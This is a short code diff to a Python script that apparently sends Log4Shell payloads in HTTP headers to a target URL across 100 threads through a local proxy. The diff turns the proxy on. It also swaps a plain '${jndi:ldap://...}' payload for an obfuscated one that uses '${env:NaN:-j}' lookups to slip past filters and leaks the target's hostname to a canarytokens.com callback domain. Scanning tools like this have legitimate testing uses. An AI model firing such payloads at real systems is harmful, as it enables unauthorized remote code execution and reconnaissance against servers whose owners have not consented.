@@ -46,7 +46,7 @@ def main():
 
     urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
     proxy = {"http" : "http://127.0.0.1:8080","https" : "http://127.0.0.1:8080"}
-    PROXY = False
+    PROXY = True
     THREADS = 100
 
     if len(sys.argv) != 3:
@@ -60,7 +60,7 @@ def main():
 
     url = sys.argv[-1]
     headers = read_file(sys.argv[-2])
-    payload = "${jndi:ldap://x${hostName}.L4J.tl6jvby071gpq088dac5st2mh.canarytokens.com/a}"
+    payload = "${{${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//x${hostName}.L4J.tl6jvby071gpq088dac5st2mh.canarytokens.com/a}"
     start(headers)
 
 
